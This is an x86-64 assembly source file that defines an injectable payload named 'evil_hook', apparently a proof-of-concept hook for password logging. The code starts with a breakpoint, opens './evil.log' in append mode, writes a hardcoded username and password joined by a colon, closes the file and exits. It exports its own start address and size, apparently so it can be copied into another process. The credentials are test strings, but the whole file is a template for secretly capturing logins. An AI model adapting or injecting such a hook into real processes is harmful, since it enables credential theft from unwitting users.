.global evil_hook, evil_hook_size

hook_start:
	int3

	# SC_open
	mov $2, %rax
	lea logpath(%rip), %rdi	
	# O_CREAT | O_APPEND | O_RDWR
	mov $0x442, %rsi
	mov $0666, %rdx
	syscall
	
	lea testuser(%rip), %rdi
	call write_string

	lea delim(%rip), %rdi
	call write_string

	lea testpass(%rip), %rdi
	call write_string

	lea newline(%rip), %rdi
	call write_string

	# close(fd)
	mov %rax, %rdi
	mov $3, %rax
	syscall

	# exit(0)
	mov $60, %rax
	mov $0, %rdi
	syscall

# rax=fd
# rdi=str_ptr
write_string:
	push %rax

	# get len
	mov %rdi, %rax
	call strlen

	mov %rdi, %rsi # buf_ptr
	pop %rdi # fd
	push %rdi
	mov %rax, %rdx

	mov $1, %rax  # SC_write
	syscall

	pop %rax
ret

strlen:
	push %rdi
	push %rsi
	push %rcx

	mov %rax, %rsi
	mov $0, %rax

	len_loop:
		mov %rsi, %rcx
		add %rax, %rcx
		movb (%rcx), %dl

		cmp $0, %dl
		jz strlen_done

		inc %rax
	jmp len_loop

strlen_done:
	pop %rcx
	pop %rsi
	pop %rdi

	ret


logpath:
	.string "./evil.log"

testuser:
	.string "blasty"

testpass:
	.string "my-1337-phrase"

delim:
	.string ":"

newline:
	.string "\n"
	
evil_hook_size:
.quad	(evil_hook_size - hook_start)
evil_hook:
.quad	hook_start

